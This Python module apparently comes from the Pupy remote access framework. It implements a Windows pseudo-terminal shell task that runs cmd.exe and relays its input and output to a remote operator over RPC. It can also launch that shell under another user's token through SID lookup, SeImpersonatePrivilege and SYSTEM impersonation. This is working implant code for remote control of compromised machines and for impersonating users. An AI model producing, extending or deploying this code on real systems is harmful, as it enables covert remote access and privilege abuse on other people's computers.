# -*- coding: utf-8 -*-

__all__ = ['acquire', 'release']

try:
    from conpty import ConPTY as PTY
except ImportError:
    from winpty import WinPTY as PTY

from collections import deque
from pupy import manager, Task
from network.lib.pupyrpc import nowait

from pupwinutils.security import (
    sidbyname, getSidToken, get_thread_token,
    token_impersonated_as_system, EnablePrivilege,
    CloseHandle
)


class PtyShell(Task):
    __slots__ = (
        'pty', 'argv', 'term', 'htoken',
        'read_cb', 'close_cb', '_buffer'
    )

    def __init__(self, manager, argv=None, term=None, htoken=None):
        super(PtyShell, self).__init__(manager)

        self.pty = None

        self.argv = argv
        self.term = term
        self.htoken = htoken

        self.read_cb = None
        self.close_cb = None

        self._buffer = deque(maxlen=50)

    def write(self, data):
        if not self.pty:
            return

        self.pty.write(data)

    def set_pty_size(self, ws_row, ws_col, ws_xpixel, ws_ypixel):
        if not self.pty:
            return

        self.pty.resize(ws_col, ws_row)

    def attach(self, read_cb, close_cb):
        if self.active:
            self.read_cb = nowait(read_cb)
            self.close_cb = nowait(close_cb)

            if self._buffer:
                for item in self._buffer:
                    self.read_cb(item)
        else:
            close_cb()

    def detach(self):
        self.read_cb = None
        self.close_cb = None

    def task(self):

        argv = self.argv
        if not argv:
            argv = r'C:\windows\system32\cmd.exe'

        try:
            self.pty = PTY(
                argv, htoken=self.htoken)

            self.pty.read_loop(self._on_read_data)

        finally:
            try:
                self.stop()
            except:
                pass

            try:
                if self.close_cb:
                    self.close_cb()
            except:
                pass

    def _on_read_data(self, data):
        self._buffer.append(data)

        if self.read_cb:
            self.read_cb(data)

    def stop(self):
        try:
            super(PtyShell, self).stop()
        finally:
            self.close()

    def close(self):
        if not self.pty:
            return

        self.pty.close()
        self.pty = None


def acquire(argv=None, term=None, suid=None):
    shell = manager.get(PtyShell)

    new = False
    if not (shell and shell.active):
        htoken = None
        hCurrentToken = None

        if suid:
            sid = None
            if suid.startswith('S-1-'):
                sid = suid
            else:
                sid = sidbyname(suid)

                if not sid:
                    raise ValueError(
                        'Unknown username {}'.format(
                            suid.encode('utf-8')))

            hSidToken = getSidToken(sid)
            if hSidToken is None:
                raise ValueError("Couldn't impersonate sid {}".format(sid))

            hCurrentToken = get_thread_token()
            if not token_impersonated_as_system(hCurrentToken):
                try:
                    EnablePrivilege('SeImpersonatePrivilege')
                except ValueError:
                    raise ValueError('Impersonate control thread as SYSTEM first')

            htoken = (hCurrentToken, hSidToken)

        try:
            shell = manager.create(
                PtyShell,
                argv, term, htoken)
        finally:
            if hCurrentToken:
                CloseHandle(hCurrentToken)

        new = True

    return new, shell

def release():
    manager.stop(PtyShell)
